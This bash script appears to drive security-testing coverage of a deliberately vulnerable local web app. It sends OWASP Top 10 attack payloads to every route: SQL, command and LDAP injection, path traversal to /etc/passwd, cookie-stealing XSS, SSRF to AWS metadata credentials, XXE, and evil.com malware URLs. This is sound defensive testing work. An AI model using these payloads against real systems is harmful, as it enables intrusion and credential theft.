#!/bin/bash

# Vulnerable App Test Suite - Exercises all OWASP Top 10 routes for IAST
# This script hits all 50 discovered routes to generate Contrast findings

# Configuration
SERVICE_URL="${1:-${BASE_URL:-http://localhost:8080}}"
BASE_URL="$SERVICE_URL"
VERBOSE="${VERBOSE:-false}"

# Colors for output
RED='\033[0;31m'
GREEN='\033[0;32m'
YELLOW='\033[1;33m'
NC='\033[0m' # No Color

# Counter
TOTAL_TESTS=0
PASSED_TESTS=0
FAILED_TESTS=0

# Helper function for logging
log() {
    echo -e "${GREEN}[$(date +'%H:%M:%S')]${NC} $1"
}

error() {
    echo -e "${RED}[ERROR]${NC} $1"
}

warn() {
    echo -e "${YELLOW}[WARN]${NC} $1"
}

# Helper function to make requests
test_route() {
    local method=$1
    local path=$2
    local data=$3
    local description=$4
    
    TOTAL_TESTS=$((TOTAL_TESTS + 1))
    
    if [ "$VERBOSE" = "true" ]; then
        log "Testing: $description"
        log "  $method $path"
    fi
    
    if [ -z "$data" ]; then
        response=$(curl -s -o /dev/null -w "%{http_code}" -X "$method" "$BASE_URL$path" 2>/dev/null)
    else
        response=$(curl -s -o /dev/null -w "%{http_code}" -X "$method" "$BASE_URL$path" -d "$data" 2>/dev/null)
    fi
    
    if [ $? -eq 0 ] && [ "$response" != "000" ]; then
        PASSED_TESTS=$((PASSED_TESTS + 1))
        [ "$VERBOSE" = "true" ] && log "  ✓ HTTP $response"
        return 0
    else
        FAILED_TESTS=$((FAILED_TESTS + 1))
        [ "$VERBOSE" = "true" ] && error "  ✗ Failed (HTTP $response)"
        return 1
    fi
}

# Start testing
log "=========================================="
log "Vulnerable App Test Suite"
log "Target: $BASE_URL"
log "=========================================="

# Wait for app to be ready
log "Checking if application is available..."
for i in {1..30}; do
    if curl -s "$BASE_URL/actuator/health" > /dev/null 2>&1; then
        log "✓ Application is ready!"
        break
    fi
    if [ $i -eq 30 ]; then
        error "Application not available after 30 seconds"
        exit 1
    fi
    sleep 1
done

log "Starting route coverage tests..."
echo ""

# ========================================
# HOME & ACTUATOR
# ========================================
log "Testing: Home & Health Endpoints"
test_route "GET" "/" "" "Home page"
test_route "GET" "/actuator/health" "" "Health check"

# ========================================
# INJECTION TESTS (A03:2021 - Injection)
# ========================================
log "Testing: Injection Vulnerabilities"
test_route "GET" "/injection" "" "Injection home"
test_route "POST" "/injection/sql" "username=admin&password=' OR '1'='1" "SQL Injection - auth bypass"
test_route "POST" "/injection/sql" "username=admin' OR 1=1--&password=anything" "SQL Injection - comment attack"
test_route "POST" "/injection/sql" "username=admin' UNION SELECT null,null,null,null,null--&password=test" "SQL Injection - UNION attack"
test_route "POST" "/injection/command" "host=localhost; cat /etc/passwd" "Command Injection - chained commands"
test_route "POST" "/injection/command" "host=localhost | whoami" "Command Injection - pipe"
test_route "POST" "/injection/command" "host=\$(whoami)" "Command Injection - subshell"
test_route "POST" "/injection/command" "host=localhost && ls -la" "Command Injection - AND operator"
test_route "POST" "/injection/ldap" "username=admin)(uid=*" "LDAP Injection"
test_route "POST" "/injection/ldap" "username=*)(uid=*))(|(uid=*" "LDAP Injection - wildcard bypass"

# ========================================
# BROKEN ACCESS CONTROL (A01:2021)
# ========================================
log "Testing: Access Control Vulnerabilities"
test_route "GET" "/access-control" "" "Access control home"
test_route "GET" "/access-control/profile/1" "" "View user profile 1 (IDOR)"
test_route "GET" "/access-control/profile/2" "" "View user profile 2 (IDOR)"
test_route "GET" "/access-control/profile/999" "" "View non-existent user (IDOR)"
test_route "POST" "/access-control/update-email" "userId=2&email=hacker@evil.com" "Horizontal privilege escalation"
test_route "POST" "/access-control/admin/delete-user/1" "" "Delete user without admin (privilege escalation)"
test_route "GET" "/access-control/download?filename=../../../etc/passwd" "" "Path traversal - /etc/passwd"
test_route "GET" "/access-control/download?filename=../../application.properties" "" "Path traversal - config file"
test_route "GET" "/access-control/download?filename=/etc/hosts" "" "Path traversal - absolute path"

# ========================================
# CRYPTOGRAPHIC FAILURES (A02:2021)
# ========================================
log "Testing: Cryptographic Failures"
test_route "GET" "/crypto" "" "Crypto home"
test_route "GET" "/crypto/get-api-key" "" "Hardcoded API key exposure"
test_route "POST" "/crypto/hash-password" "password=Password123" "Weak password hashing"
test_route "GET" "/crypto/generate-token" "" "Weak token generation"
test_route "GET" "/crypto/user-details?userId=1" "" "Sensitive data exposure"

# ========================================
# AUTHENTICATION (A07:2021)
# ========================================
log "Testing: Authentication Vulnerabilities"
test_route "GET" "/auth" "" "Auth home"
test_route "POST" "/auth/login" "username=admin&password=admin123" "Normal login"
test_route "POST" "/auth/login" "username=admin&password=wrong" "Failed login attempt 1"
test_route "POST" "/auth/login" "username=admin&password=wrong2" "Failed login attempt 2"
test_route "POST" "/auth/login" "username=admin&password=wrong3" "Failed login attempt 3 (no lockout)"
test_route "POST" "/auth/session-login" "username=admin&password=admin123" "Session-based login"
test_route "POST" "/auth/register" "username=newuser&password=weak&email=test@test.com" "Weak password registration"
test_route "POST" "/auth/register" "username=testuser&password=123&email=test@test.com" "Very weak password"
test_route "POST" "/auth/forgot-password" "email=admin@example.com" "Password reset"
test_route "POST" "/auth/check-username" "username=admin" "Username enumeration - exists"
test_route "POST" "/auth/check-username" "username=nonexistent" "Username enumeration - available"

# ========================================
# XSS (A03:2021 - Injection subset)
# ========================================
log "Testing: Cross-Site Scripting (XSS)"
test_route "GET" "/xss" "" "XSS home"
test_route "GET" "/xss/greeting?name=%3Cscript%3Ealert%28%27XSS%27%29%3C%2Fscript%3E" "" "Reflected XSS in greeting"
test_route "GET" "/xss/greeting?name=%3Cimg%20src%3Dx%20onerror%3Dalert%28%27XSS%27%29%3E" "" "Reflected XSS - img onerror"
test_route "GET" "/xss/greeting?name=TestUser" "" "Reflected XSS - normal greeting"
test_route "GET" "/xss/search?query=%3Cscript%3Ealert%28%27XSS%27%29%3C%2Fscript%3E" "" "Reflected XSS in search"
test_route "GET" "/xss/search?query=%3Cimg%20src%3Dx%20onerror%3Dalert%28document.cookie%29%3E" "" "Reflected XSS - cookie theft"
test_route "GET" "/xss/search?query=test" "" "Reflected XSS - normal search"
test_route "POST" "/xss/comment" "comment=<script>alert(document.cookie)</script>" "Stored XSS in comment"
test_route "POST" "/xss/comment" "comment=<svg onload=alert('XSS')>" "Stored XSS - SVG"
test_route "POST" "/xss/update-bio" "bio=<iframe src=javascript:alert('XSS')></iframe>" "Stored XSS in bio"
test_route "POST" "/xss/update-bio" "bio=<body onload=alert('XSS')>" "Stored XSS - body onload"

# ========================================
# SECURITY MISCONFIGURATION (A05:2021)
# ========================================
log "Testing: Security Misconfiguration"
test_route "GET" "/config" "" "Config home"
test_route "GET" "/config/debug" "" "Debug info exposure"
test_route "GET" "/config/error-test?input=invalid" "" "Verbose error messages"
test_route "GET" "/config/error-test?input=<script>alert('xss')</script>" "" "Error with XSS attempt"
test_route "GET" "/config/admin-panel?user=admin&pass=admin" "" "Admin panel with default creds"
test_route "GET" "/config/admin-panel" "" "Admin panel without auth"
test_route "GET" "/config/list-files?path=/etc" "" "Directory listing - /etc"
test_route "GET" "/config/list-files?path=." "" "Directory listing - current dir"
test_route "OPTIONS" "/config/resource" "" "Unsafe HTTP method (OPTIONS)"
test_route "TRACE" "/config/resource" "" "Unsafe HTTP method (TRACE)"

# ========================================
# SSRF (A10:2021 - Server-Side Request Forgery)
# ========================================
log "Testing: Server-Side Request Forgery"
test_route "GET" "/ssrf" "" "SSRF home"
test_route "POST" "/ssrf/fetch-url" "url=http://169.254.169.254/latest/meta-data/" "SSRF - AWS metadata"
test_route "POST" "/ssrf/fetch-url" "url=http://localhost:8080/actuator/health" "SSRF - internal service"
test_route "POST" "/ssrf/fetch-url" "url=file:///etc/passwd" "SSRF - file protocol"
test_route "POST" "/ssrf/fetch-url" "url=http://localhost:8080/h2-console" "SSRF - H2 console"
test_route "GET" "/ssrf/proxy-image?imageUrl=http://evil.com/malware.jpg" "" "SSRF via proxy - external"
test_route "GET" "/ssrf/proxy-image?imageUrl=http://localhost:8080/config/debug" "" "SSRF via proxy - internal scan"
test_route "GET" "/ssrf/proxy-image?imageUrl=http://169.254.169.254/latest/meta-data/iam/security-credentials/" "" "SSRF via proxy - AWS metadata"
test_route "POST" "/ssrf/webhook" "webhookUrl=http://internal-service/webhook" "SSRF in webhook"
test_route "POST" "/ssrf/webhook" "webhookUrl=http://localhost:8080/admin" "SSRF in webhook - internal"
test_route "POST" "/ssrf/parse-xml" "xmlContent=<?xml version=\"1.0\"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM \"file:///etc/passwd\">]><root>&xxe;</root>" "XXE - /etc/passwd"
test_route "POST" "/ssrf/parse-xml" "xmlContent=<?xml version=\"1.0\"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM \"http://169.254.169.254/latest/meta-data/\">]><root>&xxe;</root>" "XXE - AWS metadata"
test_route "POST" "/ssrf/parse-xml" "xmlContent=<?xml version=\"1.0\"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM \"file:///etc/hosts\">]><root>&xxe;</root>" "XXE - /etc/hosts"

# ========================================
# SOFTWARE AND DATA INTEGRITY (A08:2021)
# ========================================
log "Testing: Software and Data Integrity Failures"
test_route "GET" "/integrity" "" "Integrity home"
test_route "POST" "/integrity/deserialize" "data=rO0ABXNyABFqYXZhLnV0aWwuSGFzaE1hcA==" "Insecure deserialization"
test_route "POST" "/integrity/json-deserialize" "json={\"@class\":\"java.lang.Runtime\"}" "Unsafe JSON deserialization"
test_route "POST" "/integrity/upload" "fileName=malware.jar&content=base64data" "Unsafe file upload"
test_route "POST" "/integrity/update" "updateUrl=http://evil.com/malware.jar" "Unsafe software update"

# ========================================
# LOGGING & MONITORING (A09:2021)
# ========================================
log "Testing: Security Logging and Monitoring Failures"
test_route "GET" "/logging" "" "Logging home"
test_route "POST" "/logging/login-attempt" "username=admin&password=wrongpass" "Login attempt logging"
test_route "POST" "/logging/login-attempt" "username=admin\nSUCCESS: Admin logged in&password=test" "Log injection attack"
test_route "POST" "/logging/check-login" "username=admin" "Check login"
test_route "POST" "/logging/process-payment" "cardNumber=4111111111111111&cvv=123&amount=100" "Sensitive data logging"
test_route "POST" "/logging/process-payment" "cardNumber=4532-1234-5678-9010&cvv=999&amount=5000" "High value payment logging"
test_route "POST" "/logging/delete-account" "userId=1" "Insufficient logging - delete"
test_route "POST" "/logging/delete-account" "userId=999" "Insufficient logging - non-existent user"

# ========================================
# H2 CONSOLE (Development Tool - Should be disabled in prod)
# ========================================
log "Testing: H2 Database Console"
test_route "GET" "/h2-console/" "" "H2 Console access (GET)"
test_route "POST" "/h2-console/" "url=jdbc:h2:mem:testdb" "H2 Console access (POST)"

# ========================================
# RESULTS
# ========================================
echo ""
log "=========================================="
log "Test Summary"
log "=========================================="
log "Total Tests:  $TOTAL_TESTS"
log "Passed:       $PASSED_TESTS (${GREEN}✓${NC})"
log "Failed:       $FAILED_TESTS (${RED}✗${NC})"

COVERAGE=$((PASSED_TESTS * 100 / TOTAL_TESTS))
log "Coverage:     ${COVERAGE}%"
log "=========================================="

if [ $FAILED_TESTS -eq 0 ]; then
    log "✓ All tests passed! Routes exercised successfully."
    exit 0
else
    warn "⚠ Some tests failed. Application may not be fully available."
    exit 0  # Still exit 0 since failures are expected for security testing
fi
